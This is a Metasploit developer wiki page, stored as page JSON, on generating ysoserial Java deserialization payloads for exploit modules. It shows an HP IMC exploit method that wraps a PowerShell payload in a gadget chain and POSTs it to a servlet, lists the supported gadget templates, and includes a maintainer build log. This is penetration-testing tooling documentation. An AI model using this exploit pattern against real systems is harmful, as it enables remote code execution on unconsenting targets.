{"componentChunkName":"component---src-templates-wiki-template-tsx","path":"/wiki/Misc/Generating-`ysoserial`-Java-serialized-objects","result":{"data":{"markdownRemark":{"id":"d0404694-1da4-583e-9423-9aae91bb009f","frontmatter":{"title":"Generating `ysoserial` Java serialized objects","root":null},"html":"<p>Instead of embedding static Java serialized objects, Metasploit offers ysoserial-generated binaries with built-in randomization.  The benefits of using the Metasploit library include quicker module development, easier-to-read code, and future-proof Java serialized objects.</p>\n<p>To use the ysoserial libraries, let's look at an example from the <a href=\"https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/http/hp_imc_java_deserialize.rb\"><code class=\"language-text\">hp_imc_java_deserialization</code></a> module:</p>\n<h3 id=\"example-code\" style=\"position:relative;\"><a href=\"#example-code\" aria-label=\"example code permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Example code</h3>\n<p>In this example, the module calls <code class=\"language-text\">cmd_psh_payload</code> to generate a PowerShell payload, then uses the <code class=\"language-text\">ysoserial</code> library to generate a <code class=\"language-text\">JSON1</code>-based serialized object, before sending it through an HTTP POST request:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">1   def exploit\n2     cmd = cmd_psh_payload(payload.encoded, payload_instance.arch.first, {remove_comspec: true, encode_final_payload: true})\n3     data = ::Msf::Util::JavaDeserialization.ysoserial_payload(&quot;JSON1&quot;,cmd)\n4\n5     print_status &quot;Sending serialized Java object (#{data.length} bytes)...&quot;\n6     res = send_request_cgi({\n7       &#39;method&#39;   =&gt; &#39;POST&#39;,\n8       &#39;uri&#39;      =&gt; normalize_uri(target_uri.path, &#39;topo&#39;, &#39;WebDMDebugServlet&#39;),\n9       &#39;data&#39;     =&gt; data\n10    })\n11  end</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>In line 3, the module uses the <code class=\"language-text\">ysoserial_payload</code> function, passing the name of the template and the command to be embedded within the template.  The function returns a Java serialized object, which can then be passed to the vulnerable application.</p>\n<h3 id=\"calling-ysoserial_payload\" style=\"position:relative;\"><a href=\"#calling-ysoserial_payload\" aria-label=\"calling ysoserial_payload permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Calling <code class=\"language-text\">ysoserial_payload</code></h3>\n<p>The function takes two parameters, a template name and a command:</p>\n<ul>\n<li>The name parameter must be one of the support payloads stored in the <code class=\"language-text\">ysoserial</code> cache.  As of this writing, the list includes: <code class=\"language-text\">BeanShelll1</code>, <code class=\"language-text\">Clogure</code>, <code class=\"language-text\">CommonBeanutils1</code>, <code class=\"language-text\">CommonsCollections2</code>, <code class=\"language-text\">CommonsCollections3</code>, <code class=\"language-text\">CommonsCollections4</code>, <code class=\"language-text\">CommonsCollections5</code>, <code class=\"language-text\">CommonsCollections6</code>, <code class=\"language-text\">Groovy1</code>, <code class=\"language-text\">Hibernate1</code>, <code class=\"language-text\">JBossInterceptors1</code>, <code class=\"language-text\">JRMPClient</code>, <code class=\"language-text\">JSON1</code>, <code class=\"language-text\">JavassistWeld1</code>, <code class=\"language-text\">Jdk7u21</code>, <code class=\"language-text\">MozillaRhino1</code>, <code class=\"language-text\">Myfaces1</code>, <code class=\"language-text\">ROME</code>, <code class=\"language-text\">Spring1</code>, <code class=\"language-text\">Spring2</code>, and <code class=\"language-text\">Vaadin1</code>.  While <code class=\"language-text\">ysoserial</code> includes 8 other templates that are not listed above, these 8 payloads are unsupported by the library due to the need for complex inputs.  Should there be use cases for those 8 templates, please consider opening an issue and submitting a pull request to add support.</li>\n<li>The command parameter will be executed by the remote system.  The parameter is OS-agnostic, meaning that the module must determine the OS and architecture, if necessary, before generating a payload.</li>\n</ul>\n<h3 id=\"regenerating-the-ysoserial_payload-json-file-maintainers-only\" style=\"position:relative;\"><a href=\"#regenerating-the-ysoserial_payload-json-file-maintainers-only\" aria-label=\"regenerating the ysoserial_payload json file maintainers only permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Regenerating the ysoserial_payload JSON file (MAINTAINERS ONLY)</h3>\n<p><strong>Neither module developers nor users need to concern themselves with the following.</strong></p>\n<p>On occasion, Metasploit maintainers may want to re-run the script generation to incorporate new Java serialized objects from the ysoserial tool.</p>\n<p>To avoid invoking Java (and all its dependencies) at runtime, the serialized objects are generated and cached within a JSON file.  The JSON file can be refreshed using a standalone Ruby script, which comes prepackaged with a Docker image that handles downloading <code class=\"language-text\">ysoserial</code> and necessary dependencies.  The script, <code class=\"language-text\">Dockerimage</code> and a high-level <code class=\"language-text\">runme.sh</code> script is stored within <code class=\"language-text\">tools/payloads/ysoserial</code>.  An example run looks like:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">$ cd ~/git/r7/metasploit-framework/tools/payloads/ysoserial\n$ ./runme.sh \nSending build context to Docker daemon  101.8MB\nStep 1/8 : FROM ubuntu\n ---&gt; cd6d8154f1e1\nStep 2/8 : RUN apt update &amp;&amp; apt -y upgrade\n ---&gt; Using cache\n ---&gt; ba7e5691ed5a\nStep 3/8 : RUN apt install -y wget openjdk-8-jre-headless ruby-dev make gcc\n ---&gt; Using cache\n ---&gt; d38488663627\nStep 4/8 : RUN wget -q https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar -O ysoserial-original.jar\n ---&gt; Using cache\n ---&gt; 284ff722464b\nStep 5/8 : RUN wget -q https://github.com/pimps/ysoserial-modified/raw/master/target/ysoserial-modified.jar\n ---&gt; Using cache\n ---&gt; 334c1ccb6fab\nStep 6/8 : RUN gem install --silent diff-lcs json pry\n ---&gt; Using cache\n ---&gt; 9d452be9d01f\nStep 7/8 : COPY find_ysoserial_offsets.rb /\n ---&gt; 61b6f339590c\nStep 8/8 : CMD ruby /find_ysoserial_offsets.rb\n ---&gt; Running in ba7b14646e56\nRemoving intermediate container ba7b14646e56\n ---&gt; f4ca5ecb6848\nSuccessfully built f4ca5ecb6848\nSuccessfully tagged ysoserial-payloads:latest\nGenerating payloads for BeanShell1...\nGenerating payloads for C3P0...\n    Error while generating or serializing payload\n    java.lang.IllegalArgumentException: Command format is: &lt;base_url&gt;:&lt;classname&gt;\n    \tat ysoserial.payloads.C3P0.getObject(C3P0.java:48)\n    \tat ysoserial.GeneratePayload.main(GeneratePayload.java:34)\n  ERROR: Errored while generating &#39;C3P0&#39; and it will not be supported\nGenerating payloads for Clojure...\nGenerating payloads for CommonsBeanutils1...\nGenerating payloads for CommonsCollections1...\nGenerating payloads for CommonsCollections2...\nGenerating payloads for CommonsCollections3...\nGenerating payloads for CommonsCollections4...\nGenerating payloads for CommonsCollections5...\nGenerating payloads for CommonsCollections6...\nGenerating payloads for FileUpload1...\n    Error while generating or serializing payload\n    java.lang.IllegalArgumentException: Unsupported command  []\n    \tat ysoserial.payloads.FileUpload1.getObject(FileUpload1.java:71)\n    \tat ysoserial.payloads.FileUpload1.getObject(FileUpload1.java:40)\n    \tat ysoserial.GeneratePayload.main(GeneratePayload.java:34)\n  ERROR: Errored while generating &#39;FileUpload1&#39; and it will not be supported\nGenerating payloads for Groovy1...\nGenerating payloads for Hibernate1...\nGenerating payloads for Hibernate2...\n    Error while generating or serializing payload\n    java.sql.SQLException: DataSource name cannot be empty string\n    \tat javax.sql.rowset.BaseRowSet.setDataSourceName(BaseRowSet.java:855)\n    \tat com.sun.rowset.JdbcRowSetImpl.setDataSourceName(JdbcRowSetImpl.java:4307)\n    \tat ysoserial.payloads.Hibernate2.getObject(Hibernate2.java:58)\n    \tat ysoserial.GeneratePayload.main(GeneratePayload.java:34)\n  ERROR: Errored while generating &#39;Hibernate2&#39; and it will not be supported\nGenerating payloads for JBossInterceptors1...\nGenerating payloads for JRMPClient...\nGenerating payloads for JRMPListener...\n    Error while generating or serializing payload\n    java.lang.NumberFormatException: For input string: &quot;&quot;\n    \tat java.lang.NumberFormatException.forInputString(NumberFormatException.java:65)\n    \tat java.lang.Integer.parseInt(Integer.java:592)\n    \tat java.lang.Integer.parseInt(Integer.java:615)\n    \tat ysoserial.payloads.JRMPListener.getObject(JRMPListener.java:42)\n    \tat ysoserial.payloads.JRMPListener.getObject(JRMPListener.java:34)\n    \tat ysoserial.GeneratePayload.main(GeneratePayload.java:34)\n  ERROR: Errored while generating &#39;JRMPListener&#39; and it will not be supported\nGenerating payloads for JSON1...\nGenerating payloads for JavassistWeld1...\nGenerating payloads for Jdk7u21...\nGenerating payloads for Jython1...\n    Error while generating or serializing payload\n    java.lang.IllegalArgumentException: Unsupported command  []\n    \tat ysoserial.payloads.Jython1.getObject(Jython1.java:52)\n    \tat ysoserial.payloads.Jython1.getObject(Jython1.java:42)\n    \tat ysoserial.GeneratePayload.main(GeneratePayload.java:34)\n  ERROR: Errored while generating &#39;Jython1&#39; and it will not be supported\nGenerating payloads for MozillaRhino1...\nGenerating payloads for Myfaces1...\nGenerating payloads for Myfaces2...\n    Error while generating or serializing payload\n    java.lang.IllegalArgumentException: Command format is: &lt;base_url&gt;:&lt;classname&gt;\n    \tat ysoserial.payloads.Myfaces2.getObject(Myfaces2.java:47)\n    \tat ysoserial.GeneratePayload.main(GeneratePayload.java:34)\n  ERROR: Errored while generating &#39;Myfaces2&#39; and it will not be supported\nGenerating payloads for ROME...\nGenerating payloads for Spring1...\nGenerating payloads for Spring2...\nGenerating payloads for URLDNS...\n    Error while generating or serializing payload\n    java.net.MalformedURLException: no protocol: \n    \tat java.net.URL.&lt;init&gt;(URL.java:593)\n    \tat ysoserial.payloads.URLDNS.getObject(URLDNS.java:56)\n    \tat ysoserial.GeneratePayload.main(GeneratePayload.java:34)\n  ERROR: Errored while generating &#39;URLDNS&#39; and it will not be supported\nGenerating payloads for Vaadin1...\nGenerating payloads for Wicket1...\n    Error while generating or serializing payload\n    java.lang.IllegalArgumentException: Bad command format.\n    \tat ysoserial.payloads.Wicket1.getObject(Wicket1.java:59)\n    \tat ysoserial.payloads.Wicket1.getObject(Wicket1.java:49)\n    \tat ysoserial.GeneratePayload.main(GeneratePayload.java:34)\n  ERROR: Errored while generating &#39;Wicket1&#39; and it will not be supported\nDONE!  Successfully generated 0 static payloads and 22 dynamic payloads.  Skipped 8 unsupported payloads.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>At completion, the <code class=\"language-text\">data/ysoserial_payloads.json</code> file is overwritten and the 22 dynamic payloads are ready for use within the framework.  Afterward, the developer should follow the standard <code class=\"language-text\">git</code> procedures to <code class=\"language-text\">add</code> and <code class=\"language-text\">commit</code> the new JSON file  before generating a pull request and landing the updated JSON into the framework's <code class=\"language-text\">master</code> branch.</p>"}},"pageContext":{"id":"d0404694-1da4-583e-9423-9aae91bb009f"}}}